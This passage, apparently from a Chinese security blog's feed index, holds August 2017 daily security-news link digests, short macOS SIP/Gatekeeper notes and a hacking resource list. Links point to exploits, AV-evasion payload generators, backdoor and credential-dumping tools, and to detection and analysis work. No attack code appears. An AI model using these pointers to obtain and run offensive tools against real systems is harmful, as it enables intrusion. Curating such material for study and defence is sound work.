木马的清除https://sebastianblade.com/linux-xorddos-trojan-removal/]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170815安全动态]]></title>
    <url>%2F2017%2F08%2F15%2F20170815%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 mac下的渗透测试框架http://buddhalabs.com/hackports/ 1没用过，看着不错的样子 新的恶意软件滥用 PPT 播放进行传播（CVE-2017-0199）http://blog.trendmicro.com/trendlabs-security-intelligence/cve-2017-0199-new-malware-abuses-powerpoint-slide-show/ Piper - 基于 PowerShell 编写的利用命名管道做端口转发的工具https://github.com/p3nt4/Piper Web 应用中将 LFI 漏洞转换为 RFI 漏洞的技巧https://l.avala.mp/?p=241 利用 CHM 文件 Bypass Device Guard UMCI（CVE-2017-8625）https://msitpros.com/?p=3909 史上反侦察力最强木马“隐魂”：撑起色情播放器百万推广陷阱http://www.freebuf.com/articles/web/143912.html 恶意软件中的逃避技术，十八般武艺样样齐全https://mp.weixin.qq.com/s/TkVQNBeTN-5dgOC4r3oJBg 浏览器安全 / Chrome XSS Auditor bypasshttp://paper.seebug.org/376/ 在Active Directory中检测违规密码https://jacksonvd.com/checking-for-breached-passwords-in-active-directory/ WMI_Forensicshttps://github.com/davidpany/WMI_Forensics 微信Netting-QRLJacking分析利用-扫我二维码获取你的账号权限http://www.freebuf.com/column/144276.html 如何利用HTA文件在IE/Edge浏览器中执行恶意代码http://bobao.360.cn/learning/detail/4248.html Dll注入http://www.freebuf.com/articles/system/143640.html powershell版的mimikazehttps://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1 用 Certbot 一键升级你的网站为 Httpshttps://www.v2ex.com/t/383032#reply3 nginx 防范 ddos 最佳实践有哪些？https://www.v2ex.com/t/382998#reply23 一次对SNMP服务的渗透测试http://www.freebuf.com/column/144144.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170814安全动态]]></title>
    <url>%2F2017%2F08%2F14%2F20170814%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[更新的晚了点儿，今天去考科目二了，有惊无险，顺利通过，happy:) 每日安全动态 知名终端模拟软件XSHELL多版本存在后门，或上传用户服务器账号密码！http://bobao.360.cn/news/detail/4263.html 1今日头条，我想说这个各种后门的时代，一些软件能不用的尽量不用，用就用官方的、相对权威的 如何通过 Atom 编辑器的插件攻破开发者的计算机http://blog.thinkst.com/2017/08/all-your-devs-are-belong-to-us-how-to.html Google 公开的用于 Fuzz 的测试样本集https://github.com/google/fuzzer-test-suite Linux 内核 UFO/非UFO 路径切换内存破坏漏洞的 PoC(CVE-2017-1000112)https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-1000112 上周推送了一款 macOS 平台的广告恶意软件 Mughthesec，另一位研究员写了一篇分析它的 Bloghttps://babyphd.net/2017/08/wtf-is-safefinderoperatormac-campaign 使用 Active Directory 的 Powershell 模块收集域信息https://adsecurity.org/?p=3719 1搞内网的童鞋可以学习一下 攻击java反序列化https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/ 1mark Python 字节码级别的逆向https://chriswarrick.com/blog/2017/08/03/gynvaels-mission-11-en-python-bytecode-reverse-engineering/ tools - nullsecurity.net 团队收集的安全方向的工具、漏洞利用、POC、Shellcode 以及脚本https://github.com/nullsecuritynet/tools GOSINT - 开源威胁情报收集与处理框架https://github.com/ciscocsirt/gosint 微软的 PowerShell 团队开发了一个 PowerShell Module Browser 工具，支持对安装的 PS 模块和工具进行搜索https://docs.microsoft.com/en-us/teamblog/announcing-unified-powershell-experience blackhat-arsenal-tools - BlackHat 会议”军火库”涉及到的工具https://github.com/toolswatch/blackhat-arsenal-tools ttyd 远程命令执行漏洞详情及POChttps://www.nccgroup.trust/uk/our-research/technical-advisory-remote-shell-commands-execution-in-ttyd/?research=Technical Pwnhub 第一次线下沙龙竞赛Web题解析，来自 PHITHON’s bloghttps://www.leavesongs.com/PENETRATION/pwnhub-first-shalon-ctf-web-writeup.html 免杀 MSF Windows Payload 的方法与实践https://mp.weixin.qq.com/s/OxgJIIPaXMXqrY5lPdukdA NSA开发的工控ICS/SCADA态势感知开源工具Grassmarlin（附下载地址）http://www.freebuf.com/sectool/143106.html ThinkPHP 5.0.10-3.2.3 缓存函数设计缺陷可导致 Getshellhttp://paper.seebug.org/374/ WinREPL - x86/x64 汇编实时解释执行的工具https://github.com/zerosum0x0/WinREPL 逆向恶意软件教程https://securedorg.github.io/RE102/https://securedorg.github.io/RE101/ CVE-2017-8625：使用CHM bypass 设备防护UMCIhttps://msitpros.com/?p=3909]]></content>
  </entry>
  <entry>
    <title><![CDATA[macOS软件安全与逆向分析笔记]]></title>
    <url>%2F2017%2F08%2F13%2FmacOS%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Rootless安全机制 又称SIP，System Integrity Protection，系统完整性保护。通过Rootless，系统可以决定即时第三方程序获取了系统Root权限，也不能做一些事情。可以通过1$csrutil status 查看是否开启了Rootless。 Gatekeeper安全机制 用于检测从互联网上下载或者其他地方安装的软件，当他们在系统中首次运行时，确保他们的行为对系统没有危害。可以通过1$ sudo spctl --status 查看是否开启。]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170811安全动态]]></title>
    <url>%2F2017%2F08%2F11%2F20170811%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 推荐一款windows方便查看文件的MD5/sha1值-HashTab给文件属性窗口添加校验值http://implbits.com/products/hashtab/ windows下的包管理工具https://chocolatey.org/docs Mac下的破解软件真的安全吗？https://mp.weixin.qq.com/s?__biz=MzIzNTA5MzI3Mg==&amp;mid=2650591970&amp;idx=1&amp;sn=86cdb0e4c15112bd094754b5de16196d&amp;chksm=f0e41e95c79397833b1b758a366667990721e0eb7057b969dd160da0cf4ca05137d9529d38ff&amp;mpshare=1&amp;scene=1&amp;srcid=0811TnBRyB73qbz12FzqQwtQ&amp;key=f134dcd2fe72c7c615e2527bc29fa4ba60f1473b8171d2d3fde63708164b2471c92db9684ecb393ddeb1fa866016522291c6f4e8694f996b3b52f11aab7bbe2e48917fd59c3ca3c995bd629291052f2d&amp;ascene=0&amp;uin=NzQxNDQ1&amp;devicetype=iMac+MacBookPro11%2C3+OSX+OSX+10.12.6+build(16G29)&amp;version=12020810&amp;nettype=WIFI&amp;fontScale=100&amp;pass_ticket=LzFJ3x2GZA06fhxalMi3NMX9Vd0tMSj7gZSKMtcv8%2Bs%3D “灵隐”木马黑吃灰：绑架数十款游戏外挂实现恶意推广http://www.freebuf.com/articles/system/143461.html 记一次对Discuz官方论坛的渗透检测https://www.t00ls.net/articles-21006.html 使用Kerberoast破解Kerberos TGS Tickets - 利用Kerberos Compromise Active Directory域https://adsecurity.org/?p=2293 Plecost：Wordpress指纹识别工具（识别版本、插件，匹配已知漏洞）https://github.com/iniqua/plecost np1sec：分布式多方通讯加密协议https://github.com/equalitie/np1sec 解决遗忘linux登陆密码http://blog.nsfocus.net/resolve-forgotten-linux-login-password/ 如何搭建一个 DNS Sinkhole 服务器，DNS Sinkhole 是指一种 DNS 响应欺骗技术，常被防御者用于发现受保护网络内的受感染机器，还有一份来自 Palo Alto 的文档参考http://handlers.sans.org/gbruneau/docs/DNS_Sinkhole_setup.pdf 利用 Adobe Flash 的沙箱逃逸漏洞，结合 UNC/file SMB 密钥转发的问题，泄露 Windows 用户的登陆密码(CVE-2017-3085)https://blog.bjornweb.nl/2017/08/flash-remote-sandbox-escape-windows-user-credentials-leak/ BeRoot - Windows 本地提权工具，寻找本地机器配置上的疏漏实现提权https://github.com/AlessandroZ/BeRoot 琢石成器之自动化去广告神器(Green Creator)https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651132861&amp;idx=1&amp;sn=488f6ca6706527f037da88801dde4d71&amp;chksm=bd5083e98a270aff38c4afcac207a682cc1260936bf18422510dde78d52ae55e685ad4278240&amp;scene=0&amp;key=05d58d453d781a663f27a7bce0a851b4a18fc79d8c1ec2966f2538c19846f47804c2d5e0ace080c46915c5db458da9ee43c94e057b3fdffbda16bcb06800727f568dab3453aacf9a9bea47d176c4ec5e&amp;ascene=0&amp;uin=NzQxNDQ1&amp;devicetype=iMac+MacBookPro11%2C3+OSX+OSX+10.12.6+build(16G29)&amp;version=12020810&amp;nettype=WIFI&amp;fontScale=100&amp;pass_ticket=LzFJ3x2GZA06fhxalMi3NMX9Vd0tMSj7gZSKMtcv8%2Bs%3D其它简洁优雅的在Mac上安装软件-homebrew-cask命令行神器 0.ring3-DLL劫持技术详解(lpk.dll)常见的后门技术总结-小议权限维持技术以下是DarkRay师傅的几篇文章渗透师的powershell入门快速判断文件是否为病毒教你如何分析病毒的行为mac的使用内网渗透之隐私收集Windows编程入门答学弟问一个HTTP类的实现各种Payload免杀工具集Ph4nt0m Webzine CheckList渗透师升级指南域内网渗透小结]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170810安全动态]]></title>
    <url>%2F2017%2F08%2F10%2F20170810%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 区块链从入门到放弃（区块链入门帖汇总整理）https://bbs.bumeng.cn/thread-848-1-1.html?hmsr=v2ex&amp;hmpl=&amp;hmcu=&amp;hmkw=&amp;hmci= iOS渗透测试第一步—环境配置及简单基础http://www.freebuf.com/column/143844.html Hadoop学习与应用(一)http://blog.nsfocus.net/hadoop-learning-applications/ struts2漏洞中关于动态方法调用的一点思考http://blog.nsfocus.net/thoughts-dynamic-method-call-struts2-vulnerability/ 实战Linux下三种不同方式的提权技巧http://bobao.360.cn/learning/detail/2984.htmlhttp://blog.csdn.net/gzh0222/article/details/8453184 1是时候梳理和总结一下Linux的提权技巧了 linux取证技术介绍https://countuponsecurity.com/2017/04/12/intro-to-linux-forensics/ macOS 系统一款携带有效开发者签名的 Mughthesec 广告软件靠劫持用户浏览器获利https://threatpost.com/signed-mughthesec-adware-hijacking-macs-for-profit/127333/ 利用 WinDbg 调试器结合 wscript.exe 分析 JavaScript 脚本http://blog.talosintelligence.com/2017/08/windbg-and-javascript-analysis.html EggShell - 命令行版的 iOS/macOS 远程管理工具，支持获得系统信息、设备控制、用户交互、定位信息等等https://github.com/neoneggplant/EggShell Awesome Lockpicking - 与开锁、锁具安全性有关的资料整理https://github.com/meitar/awesome-lockpicking 不为人知的地下暗流：揭秘色情推广“影科技”家族背后的流量生意http://www.freebuf.com/articles/network/143728.html androidre：逆向Android程序的docker镜像https://github.com/cryptax/androidre LINUX内网渗透https://mp.weixin.qq.com/s/VJBnXq3--0HBD7eVeifOKA 写shellcode执行iptables -P INPUT ACCEPThttps://0day.work/writing-my-first-shellcode-iptables-p-input-accept/ 一个价值一万刀的Google漏洞https://sites.google.com/site/testsitehacking/10k-host-header 1Google真豪气 关于C/S架构系统的安全监测http://www.freebuf.com/articles/system/143513.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[Awosome Hacking系列]]></title>
    <url>%2F2017%2F08%2F09%2FAwosome-Hacking%E7%B3%BB%E5%88%97%2F</url>
    <content type="text"><![CDATA[About这里推荐一下github上的一个项目Awesome-Hacking安全研究方向的一些参考资源，质量还是不错的,涵盖的方面比较的广. listAndroid安全：收集了各种Android工具、报告/研究/书籍、漏洞/利用代码等资源 应用安全：了解学习应用程序安全的资源列表 漏洞赏金：漏洞赏金计划集合和著名赏金猎人博客列表 Cheatsheets：常见的渗透测试/安全备忘录 CTF：CTF框架、类库、资源、软件和教程清单 网络攻击环境：可以合法地锻炼培养自己攻击技能的环境集合 安全开发运维：devsecops.org社区贡献的权威devsecops工具列表 Exploit开发：学习exploit开发的资源 Fuzzing：各种fuzzing图书、课程、工具、教程和易受攻击应用集合 Hacking：Awesome Hacking资源列表 蜜罐：包括不同类型的蜜罐、蜜罐工具、蜜罐分析等 事件响应：旨在帮助安全分析师和数字取证人员 工控安全：包括工具、蜜罐、数据、警报和新闻、会议各种工控安全等 信息安全：有各种信息安全公开课、培训信息 IoT安全：聚合了大量IoT破解案例，如RFID、门铃、中控、可穿戴等 恶意软件分析：包括恶意软件收集、开源威胁情报、检测、沙箱等 开源情报：情报界的各种开源情报来源 OS X和iOS安全：OS X和iOS安全工具集合 Pcaptools：流量处理的命令集、捕获工具、分析检查、DNS配置等工具资源 渗透测试：在线渗透测试资源、Shellcode开发、开源情报资源、社会工程资源等 PHP安全：PHP生成安全随机数、加密数据、检查漏洞等类库 逆向：关于逆向的图书、培训、实战、工具等 安全演讲：收集了2013-2017年各类安全大会演讲视频 SecLists：安全测试人员进行评估检查需要用到的技能 Security：Awesome Security，一个社区驱动的知名安全资源分类集合 社会工程学：仅供网络安全人员、渗透测试人员在受控环境用于教育用途 静态分析：针对各种编程语言的静态分析工具、linters、代码质量检查等 威胁情报：包括常见威胁情报来源、格式、架构、工具、研究标准书籍等 车辆安全：关于车辆安全的学习资源、项目、软硬件、汽车黑客案例、Twitter follower列表等 漏洞研究：相对偏学术方向，有不少书籍、会议、报告等推荐 Web黑客：Web安全入门各种书籍、文档、工具 Windows漏洞利用：Windows堆栈溢出、内核攻击、内存损坏、内存保护等内容资源 WiFi兵工厂：针对802.11协议攻击的各类工具 可用知识库API安全检查清单：当你设计、测试、发布API时，需要核对的安全细节清单 APT Notes：2008年至今的所有APT行动披露报告汇总，中国出现了11次 赏金漏洞披露列表：偏Web向的常见漏洞类型案例披露 密码学：密码学的理论、工具、框架、资源等 CFT工具：CTF从入门到了解各种工具 CVE PoC库：博主从13年到现在收集的数十个CVE漏洞的PoC 取证：数字取证的常见工具资源 免费编程书：关于系统、数据库、IDE、编程语言等方面的免费书 灰帽黑客资源：CTF、加密学、Linux Hacking、USB Hacking、漏洞等 信息安全入门：包括信息安全博客、认证、课程、社区、播客、工具等 安全资源：一个类似MITRE ATT&amp;C的框架 IOC：常见IOC资源、工具 Linux内核利用库：2005年至今的Linux内核利用技术演讲、漏洞、Writeups等 网络安全领域的机器学习：相关研究的数据集、论文、书籍、演讲等 恶意软件脚本：博主收集的二十几个脚本 Payloads：一大波常见Web攻击Payloads Payloads集合：比上面这个更丰富的常见Web攻击Payloads 五星级Cheatsheets：包括OS X命令行、PowerShell命令行、Google Dorks、Shodan、exploit开发、Java反序列化等最全备忘 Pentest Wiki：博主收集的在线安全知识库，里边涵盖网络分析、Web应用、开源情报、漏洞分析、编程开发等多个领域 字典：作者自称找了超过80GB密码库，从中总结出这个字典项目 Resource List：零碎的GitHub安全项目汇总，涉及PWND、PowerShell、CTF、恶意软件等 逆向工程：常见软件、类库、书籍、技术分析、开发等 RF安全工具箱：国人@cn0xroot 聚合的各类射频资源集合，包括SDR、GSM、3G、4G LTE、NFC&amp;RFID、ZigBee等 安全备忘录：收集了许多信息安全工具和主题 安全清单：一大波详实的全系列安全资源 Shell：一系列Shell命令行、工具、指南等 威胁猎人攻略：帮助安全分析师利用Sysmon和Windows Events日志来进行事件分析，涉及Splunk、ELK、Sigma、GrayLog等工具]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170809安全动态]]></title>
    <url>%2F2017%2F08%2F09%2F20170809%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 安全研究方向的一些参考资源，质量还是不错的,涵盖的方面比较的广https://github.com/Hack-with-Github/Awesome-Hacking 利用CLR实现一种无需管理员权限的后门http://www.4hou.com/technology/6863.html 渗透技巧——Windows日志的删除与绕过https://xianzhi.aliyun.com/forum/read/1814.html 绕过杀毒软件与主机入侵防御系统对流量的检测http://www.freebuf.com/articles/network/142418.html 1待测试 Chkrootkit Sourcecode Learninghttp://www.cnblogs.com/LittleHann/p/3918030.html 看我如何对Apache进行模糊测试并挖到了一个价值1500刀的漏洞http://bobao.360.cn/learning/detail/4213.html 1这个不错，mark Windows环境下的信息收集https://mp.weixin.qq.com/s/37xtTdjVetMg5P1WaJvYvA Vuzzer自动漏洞挖掘工具简单分析附使用介绍http://www.freebuf.com/sectool/143123.html 追寻恶意 NPM 包http://www.freebuf.com/news/143003.htmlhttps://duo.com/blog/hunting-malicious-npm-packages check_all_apks - 检测已知的安卓恶意应用的脚本https://github.com/kudelskisecurity/check_all_apks 来自 Project Zero 的 Windows 漏洞利用技巧系列文章，如何将任意目录创建漏洞转化成任意文件读https://googleprojectzero.blogspot.com/2017/08/windows-exploitation-tricks-arbitrary.html 我在全球最大的同性社交平台那点事http://www.freebuf.com/column/143633.html 1这里主要介绍了基于爬虫的数据攻击，虽然不能用作定向攻击，但是呢，危害还是有的 看我如何从54G日志中溯源web应用攻击路径https://secvul.com/topics/715.html osx-and-ios-security-awesomehttps://github.com/ashishb/osx-and-ios-security-awesome CVE-2017-8620：Windows Search远程代码执行漏洞https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8620 1学习一下微软给的修复指南 MAC osx、iOS常见安全工具汇总https://github.com/ashishb/osx-and-ios-security-awesome BoopSuite：基于Python的无线审计、安全测试套件https://github.com/MisterBianco/BoopSuite 披着羊皮的狼：攻击者如何利用漏洞以特定图标伪装可执行文件http://www.freebuf.com/articles/system/143365.html1用作欺骗攻击这个好像很6]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170808安全动态]]></title>
    <url>%2F2017%2F08%2F08%2F20170808%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 零C++基础，打造Windows事件钩子：对WMI的深入分析http://bobao.360.cn/learning/detail/4214.html 1推荐阅读原版英文文章,安全客和freebuf翻译的文章，建议都还是看英文原版的文章。 对 Twitter （Periscope）API 测试过程中遇到的有趣的问题http://bobao.360.cn/learning/detail/4207.html Intrusion Detection Avoidance Payload Generator: NPS_Payloadhttps://n0where.net/intrusion-detection-avoidance-payload-generator-nps_payload/ iOS macOS Remote Administration Tool: EggShellhttps://n0where.net/ios-macos-remote-administration-tool-eggshell/ 1苹果系统的远控？ MITM RDP connections: Seth 中间人攻击RDPhttps://n0where.net/mitm-rdp-connections-seth/ p0wnedShell-DarkVersionhttps://github.com/3gstudent/p0wnedShell-DarkVersion 老毛桃PE盘工具木马：一款“通杀”浏览器的主页劫持大盗http://www.freebuf.com/articles/web/143462.html libcrafter: 用于网络数据包嗅探和制作的高等级 C++ 库https://github.com/pellegre/libcrafter Early release Video! Elie Bursztein - How We Created the First SHA 1 Collisionhttps://www.youtube.com/watch?v=NbHL0SYlrSQ&amp;feature=youtu.be The Windows Malware Analysis Distribution: flare-vmhttps://n0where.net/the-windows-malware-analysis-distribution-flare-vm/ 1好像很不错的样子？下一个试试？！ Electron hack —— 跨平台 XSShttps://mp.weixin.qq.com/s/DgjJ6uKtuUPFQhgztL69RQ 给shellcode找块福地－ 通过VDSO绕过PXNhttps://mp.weixin.qq.com/s/fVfk5aRO4bKgA4qfEX3Qlw 腾讯安全反病毒实验室：揭秘“挂马”黑产最新态势http://www.freebuf.com/articles/system/143217.html PowerShell Obfuscation Detection Framework: Revoke-Obfuscationhttps://n0where.net/powershell-obfuscation-detection-framework-revoke-obfuscation/ 1powershell 混淆检测框架 使用 docker 对容器资源进行限制http://cizixs.com/2017/08/04/docker-resources-limit Automated Privilege Escalation: portiahttps://n0where.net/automated-privilege-escalation-portia/ 1自动权限提升工具、? ProcInfo - Objective-See 开源的一款 macOS 系统进程信息查看工具https://github.com/objective-see/ProcInfo 解锁更多姿势——手机锁屏安全研究https://security.tencent.com/index.php/blog/msg/118 Visual Studio 2017 新添加了一个警告框，打开网络上下载的自定义的 .sln 工程文件时，如果存在潜在的 RCE，VS2017 将会弹框警告https://twitter.com/fdfalcon/status/894713581811503104 1这个有意思 给shellcode找块福地－ 通过VDSO绕过PXNhttps://mp.weixin.qq.com/s/fVfk5aRO4bKgA4qfEX3Qlw Python调用Win32 API实现截图https://mp.weixin.qq.com/s?__biz=MzI4NjEyMDk0MA==&amp;mid=2649846681&amp;idx=1&amp;sn=90f94c17d2e7ed0efde11b45614f5ee0&amp;chksm=f3e41d1ac493940ccf25647e65d3bc8a155556a6272e5d9806e96e63c70c70f9a2b128f82fbe&amp;mpshare=1&amp;scene=23&amp;srcid=08076TlTqLIWCQxsRf38M7ML#rd其它1最近在用cobalt strike，工具用起来不错，已经有人写好了相关的文章自己也就不写了，推荐几篇文章。 1.Cobalt strike3.0使用手册2.强化你的Cobalt strike之Cortana3.Cobalt Strike学习笔记]]></content>
  </entry>
  <entry>
    <title><![CDATA[博客推荐]]></title>
    <url>%2F2017%2F08%2F07%2F%E5%8D%9A%E5%AE%A2%E6%8E%A8%E8%8D%90%2F</url>
    <content type="text"><![CDATA[web安全 https://github.com/CHYbeta/Web-Security-Learningwindows系统安全 https://3gstudent.github.io/3gstudent.github.io/ https://www.blackh4t.org/macOS以及ios安全 https://sskaje.me/ https://github.com/buginux https://github.com/TKkk-iOSer/FullStack？&amp; pwn http://3xp10it.cc/index2.html http://blog.csdn.net/freexploit/article/details/2038442 https://github.com/CHYbeta/Software-Security-Learninglinux安全 http://pwn4.fun/]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170807安全动态]]></title>
    <url>%2F2017%2F08%2F07%2F20170807%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 SMBLoris:Windows拒绝服务metasploit模块https://github.com/rapid7/metasploit-framework/pull/8796 Supervisord远程命令执行漏洞（CVE-2017-11610）https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html 创建从 Github 仓库中自更新的 Powershell 脚本https://curi0usjack.blogspot.com/2017/08/creating-self-updating-powershell.html 大型客户端渗透测试 第3部分：Java 反序列化漏洞导致的远程代码执行http://blog.securelayer7.net/thick-client-penetration-testing-3javadeserialization-exploit-rce/ 用于创建后门的python包https://0x00sec.org/t/a-python-package-for-creating-backdoors/3170 access 无select SQL注射https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10663 win7粘滞键后门http://3xp10it.cc/web/2017/08/03/win7%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/ 如何自制Boot Loaderhttps://www.codeproject.com/Articles/36907/How-to-develop-your-own-Boot-Loader 一个针对渗透测试工程师、安全研究员的学习资源收集汇总https://github.com/Hack-with-Github/Awesome-Hacking/blob/master/README.md ANGRYPUPPY（Cobalt Strike框架的工具）介绍https://www.mdsec.co.uk/2017/08/introducing-angrypuppy/ nessus_compliance_generator - 为 Nessus 生成 Windows 和 SQL 服务的审计文件的 GUI 程序https://github.com/Argonne-National-Laboratory/nessus_compliance_generator PhEmail：基于Python的开源邮件钓鱼工具https://github.com/Dionach/PhEmail 前两周的 BlackHat 会议上，有研究员分享了 Electron 框架的安全性研究，基于 Electron 我们可以用 HTML+JS 编写桌面应用。会议结束后，他写了一篇 Blog 介绍 BlackHat 上的分享，《现代冶炼技术：从 XSS 到 RCE》https://blog.doyensec.com/2017/08/03/electron-framework-security.html Hackazon - Rapid7 开源的 Web 漏洞练习框架，类似 Hacksys 的 HEVDhttps://github.com/rapid7/hackazon 利用 Stelf 工具帮助 Metasploit 生成可以 Bypass 杀软的 Payloadhttps://0x00sec.org/t/how-to-get-a-super-stelfy-shell-that-av-doesnt-pick-up/1860 ANGRYPUPPY 介绍，一款在 CobaltStrike 框架上执行 BloodHound 攻击的工具https://www.mdsec.co.uk/2017/08/introducing-angrypuppy/ 之前推送过有人利用 “TYPO-SQUATTING” 污染 Python 软件包库，ThreatPost 这篇报道提到一位叫做 HackTask 的用户正在用同样的方法攻击 Node.js NPM 软件库。TYPO-SQUATTING 指上传恶意软件包，并且起个和其他热门库相似的名字，这样用户可能因错别字误装https://threatpost.com/attackers-use-typo-squatting-to-steal-npm-credentials/127235/ 1类似之前的pip钓鱼 Apache Tomcat 7.x 安全加固指南https://www.ernw.de/download/hardening/ERNW_Checklist_Tomcat7_Hardening.pdf Windows Shellcode学习笔记——通过VisualStudio生成shellcodehttps://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E9%80%9A%E8%BF%87VisualStudio%E7%94%9F%E6%88%90shellcode/ Windows Shellcode学习笔记——栈溢出中对jmp esp的利用与优化https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%AD%E5%AF%B9jmp-esp%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E4%BC%98%E5%8C%96/ 1推荐此人博客，干货很多 以jmp esp 为跳板的shellcode开发http://blog.csdn.net/swjtu100/article/details/50032831 i春秋免费的且比较好的课程 二进制漏洞实例分析https://www.ichunqiu.com/course/56119 cobalt strike 高级渗透(老外的演讲)https://www.ichunqiu.com/course/57945 缓冲区溢出的由来https://www.ichunqiu.com/course/50563 缓冲区溢出原理https://www.ichunqiu.com/course/144]]></content>
  </entry>
  <entry>
    <title><![CDATA[20170804安全动态]]></title>
    <url>%2F2017%2F08%2F04%2F20170804%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 Little trick 1公司的无线使用shadowsocks代理上不了网，有线是可以的，但是有时候又需要用到无线代理上网怎么办，这个时候将shadowsocks的端口改为443就可以了，80应该也可以，猜测是公司无线网有防火墙，对除了80，443都进行了拦截:P Linux VPS安装Stat Hub自建服务器监控https://www.xiaoz.me/archives/8449 1类似于zabbix 使用轻量级工具Sysmon监视你的系统http://www.freebuf.com/sectool/122779.html 恶意文件常驻方法总结https://green-m.github.io/2017/06/12/malware-persistence-methods/ avet：杀软绕过工具使用教程http://bobao.360.cn/learning/detail/4196.html 内核池溢出漏洞利用实战之Windows 7篇http://bobao.360.cn/learning/detail/4188.html 第一只WiFi蠕虫的诞生：完整解析博通WiFi芯片Broadpwn漏洞（含EXP／POC）http://www.freebuf.com/vuls/142099.html 工具解析|杀毒引擎惨遭打脸，黑帽大会爆惊天免杀工具http://www.freebuf.com/news/142758.html Supervisord远程命令执行漏洞（CVE-2017-11610）https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html 如何检测0day及无文件恶意软件https://community.rapid7.com/community/insightidr/blog/2017/07/26/how-do-you-identify-zero-days-and-fileless-malware-download-the-ram Python化VMware后门https://www.zerodayinitiative.com/blog/2017/8/1/pythonizing-the-vmware-backdoor CheckPlease:Payload-Agnostic Implant Securityhttps://github.com/Arvanaghi/CheckPlease PowerShell混淆检测https://www.fireeye.com/blog/threat-research/2017/07/revoke-obfuscation-powershell.html dnstwist：域名排列引擎，检测域名拼字错误，用于检测网络钓鱼及企业间谍活动https://github.com/elceef/dnstwist Windows Defender ATP机器学习：检测新异常行为https://blogs.technet.microsoft.com/mmpc/2017/08/03/windows-defender-atp-machine-learning-detecting-new-and-unusual-breach-activity/ 利用 Gmail 作为 C&amp;C 通信机制的 Gcat/Gdog 后门介绍https://pentestlab.blog/2017/08/03/command-and-control-gmail/ 当代网络攻击中的隐写术介绍https://securelist.com/steganography-in-contemporary-cyberattacks/79276/ 3亿6千万可免费下载的被黑密码使用方式介绍https://www.troyhunt.com/introducing-306-million-freely-downloadable-pwned-passwords/ koadic - 基于 JScript 实现的 Windows Rootkit，适用于 Windows 全版本https://github.com/zerosum0x0/koadic Linux端口转发特征总结https://mp.weixin.qq.com/s?__biz=MzA3Mzk1MDk1NA==&amp;mid=2651903919&amp;idx=1&amp;sn=686cc53137aa9e8ec323dda1e54a2c23&amp;chksm=84e3442ab394cd3ccafd8006cbabdc3c0bf305a6543e0b55ea4aaa51c8768dc8eb5cfee2a0d4&amp;scene=0&amp;key=9ec4abb5f2e93c325c1038fbaa71d8eb9fddffb90e52fffa49b5d8b05cf5b23904d2a5e17141d9a3cbab135776fe639ca94af09c46a96e8a2d248b13ccf212c3013dc16d93b2868ba0c20a3d0bb1e5f8&amp;ascene=0&amp;uin=NzQxNDQ1&amp;devicetype=iMac+MacBookPro11%2C3+OSX+OSX+10.12.6+build(16G29)&amp;version=12020810&amp;nettype=WIFI&amp;fontScale=100&amp;pass_ticket=3CZgTPuDZC%2Fe%2B%2FEt3khN%2BdmAeDRAMcfpu4ErOLdGNOY%3D 通过向 Windows Scripting Host (WSH) 已签名脚本中注入代码，绕过 Windows 对 WSH 文件签名才能执行的保护https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/ Learning PowerShell: basic programshttps://blog.malwarebytes.com/101/2017/08/learning-powershell-basic-programs/ 踏雪无痕——对新型无文件后门 JS_POWMET 的简单分析http://www.4hou.com/info/observation/6997.html 从恶意软件获得的新姿势——通过rundll32.exe执行js原理详细分析http://bobao.360.cn/learning/detail/164.html Flarum: 极简论坛搭建教程https://liyuans.com/archives/Flarum.html1想做论坛的小伙伴儿可以关注下]]></content>
  </entry>
  <entry>
    <title><![CDATA[windows PE文件结构]]></title>
    <url>%2F2017%2F08%2F03%2Fwindows-PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%2F</url>
